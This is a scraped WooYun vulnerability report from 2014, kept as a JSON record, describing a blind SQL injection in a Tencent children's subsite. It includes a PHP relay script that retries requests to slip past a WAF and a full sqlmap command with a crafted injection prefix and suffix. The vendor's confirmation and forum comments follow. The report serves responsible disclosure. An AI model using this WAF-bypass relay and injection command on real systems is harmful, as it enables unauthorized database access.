{"id": 1948, "wybug_id": "wooyun-2014-067581", "wybug_title": "腾讯某分站一个比较有意思的SQL注射漏洞", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2014-07-05 23:26", "wybug_open_date": "2014-08-19 23:28", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向公众公开  简要描述： 今天讨论着腾讯的waf那么牛B，单参数注入不知道怎么绕过。。再回看之前发现的某些SQL注入点，发现还可能存在这样的问题。详细如下。。。 详细说明：  首先，waf对单URL，单参数过滤还是比较成功的，当然前提是对http包解释正确。但经测试，多种变型的http包，都直接过滤了，单参数实在没有办法绕过呀。。但无意中发现，经多次点击，有时居然不会拦。猜测是后台负载有些服务器没有配置好waf过滤。好吧，这可以利用了。但各种工具或手工也是比较麻烦，为了证实注入的存在。于是在本地搞个转发，然后扔给SQLMAP跑跑看。注入地址为：http://fun.kid.qq.com/ebookController/update_assets_list?&=a&campaignID=1&etclass=0&formatID=6&t=Fri%20Jun%2027%2012:27:18%20GMT+0800%202014&tags=&templateID=561注入参数为： formatID这是一个不爆错，没影响内容的注入。只能利用条件，返回状态码来盲注。本地转发代码：\n<?php$s= stripcslashes( $_GET[\"s\"]);do{$result = @file_get_contents(\"http://fun.kid.qq.com/ebookController/update_assets_list?&=a&campaignID=1&etclass=0&formatID=6\".urlencode($s).\"&t=Fri%20Jun%2027%2012:27:18%20GMT+0800%202014&tags=&templateID=561\");}while(strstr($http_response_header[0],\"Implemented\"));echo $result ;?>\nsqlmap 参数设置：python sqlmap.py -u \"http://192.168.121.129/s.php?s=\" -p \"s\" --prefix \"%22 and 1=if((1=1\" --suffix \"),1,(select 1 union select 2)) and %22%22=%22\" --dbms=mysql -v 0 --threads 2 --string \"data\" 结果如图：（一般情况下我是不会那么无聊跑表的，这个有点意思，就测试了一下。）   漏洞证明：  \n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-07-07 16:00 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-05 23:28 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  Mark    \n     2014-07-05 23:32 |    \t\tYY-2012 \t\t\t( 普通白帽子  |\t\t\t        Rank:2763 漏洞数:641        | 意淫，是《红楼梦》原创的词汇，但后来演变...)\t\t \n  看我签名    \n     2014-07-05 23:39 |    \t\tv0yager_1ce \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  火前留名    \n     2014-07-05 23:52 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  目测不是任何形式的提交 绕过    \n     2014-07-05 23:53 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  很给力啊看起来    \n     2014-07-05 23:58 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  单参数绕过，，，   多次赋值？期待！    \n     2014-07-06 09:35 |    \t\tmaples \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | 学习的小菜鸟)\t\t \n  MARK    \n     2014-07-06 09:38 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  屌爆了...    \n     2014-07-06 10:41 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  mark一下 养肥了再看    \n     2014-07-06 13:14 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  你关注的白帽子 Jannock 发表了漏洞 腾讯某分站一个比较有意思的SQL注射漏洞    \n     2014-07-06 17:16 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  关注你的白帽子 Jannock 发表了漏洞 腾讯某分站一个比较有意思的SQL注射漏洞    \n     2014-07-06 17:18 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  求过腾讯的免杀马儿    \n     2014-07-06 17:18 |    \t\t土豪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:6        | 我是土豪却没有5WB)\t\t \n  你关注的白帽子 Jannock 发表了漏洞 腾讯某分站一个比较有意思的SQL注射漏洞    \n     2014-07-07 09:27 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  [code]详细[/code]    \n     2014-07-07 09:45 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  坐等    \n     2014-07-07 16:08 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  MK    \n     2014-08-07 09:47 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  @Jannock 牛逼，本地转发，是不是就是那个注入中转啊？？？？    \n     2014-08-07 22:13 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  看不懂怎么办？    \n     2014-08-20 10:16 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  mark    \n     2014-08-28 12:18 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  同样看不懂，先mark，以后再学    \n     2014-10-08 16:16 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  赶脚语法很高端那    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}